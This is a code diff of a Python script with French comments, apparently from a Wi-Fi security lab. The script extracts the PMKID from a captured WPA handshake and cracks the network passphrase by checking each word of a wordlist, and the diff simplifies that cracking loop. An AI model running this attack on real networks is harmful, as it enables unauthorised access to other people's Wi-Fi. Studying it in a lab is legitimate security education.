@@ -28,7 +28,7 @@ def findBeacon(capture):
     Cette fonction détecte et retourne le premier Beacon de la capture
     """
     for frame in capture:
-        # si la trame est de type et sous-type Beacon, on la retourne 
+        # si la trame est de type et sous-type Beacon, on la retourne
         if frame.type == 0 and frame.subtype == 8:
             return frame
 
@@ -44,15 +44,14 @@ def find4wayHandShake(capture):
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("PMKID_handshake.pcap")
 
-
-# Recuperation de la premiere trame du handshake pour extraire pmkid 
+# Recuperation de la premiere trame du handshake pour extraire pmkid
 handshake_first = find4wayHandShake(wpa)
 # recherche du premier beacon dans la capture
 Beacon = findBeacon(wpa)
 # Récupération du SSID
 ssid = Beacon.info.decode("utf-8")
 # Récupération de l'adresse MAC de l'AP
-APmac = a2b_hex(Beacon.addr2.replace(':', ''))          # "cebcc8fdcab7"
+APmac = a2b_hex(Beacon.addr2.replace(':', ''))
 # Récupération de l'adresse MAC du client
 Clientmac = a2b_hex(handshake_first.addr1.replace(':', ''))
 # Récupération du PMKID
@@ -63,25 +62,18 @@ print("============================")
 print("SSID: ", ssid, "\n")
 print("AP Mac: ", b2a_hex(APmac), "\n")
 print("CLient Mac: ", b2a_hex(Clientmac), "\n")
-print("PMKID from capture : ", PMKID, "\n\n")
+print("PMKID from capture: ", PMKID, "\n\n")
 
 with open('wordlist.txt','r') as file:
-   
-    # reading each line    
+
+    # reading each line
     for line in file:
-        find = False 
-        # reading each word        
-        for passPhrase in line.split():
+        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        pmk = pbkdf2(hashlib.sha1,str.encode(line.rstrip('\n')), str.encode(ssid), 4096, 32)
 
-            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-            pmk = pbkdf2(hashlib.sha1,str.encode(passPhrase), str.encode(ssid), 4096, 32)
+        # calculate the pmkid from the word in wordlist
+        pmkid_from_wordlist = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
 
-            pmkid_from_wordlist = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
-
-            print ( "Computed PMKID:\t\t", pmkid_from_wordlist.hexdigest()[0:32],"\n",
-                    "passPhrase : ", passPhrase)
-            if(hmac.compare_digest(PMKID, pmkid_from_wordlist.hexdigest()[0:32])):
-                print("Success ! The key is : ", passPhrase) 
-                find = True 
-        if find: 
-            break 
+        if(hmac.compare_digest(PMKID, pmkid_from_wordlist.hexdigest()[0:32])):
+            print("Success ! The key is : ", line.rstrip('\n'))
+            break
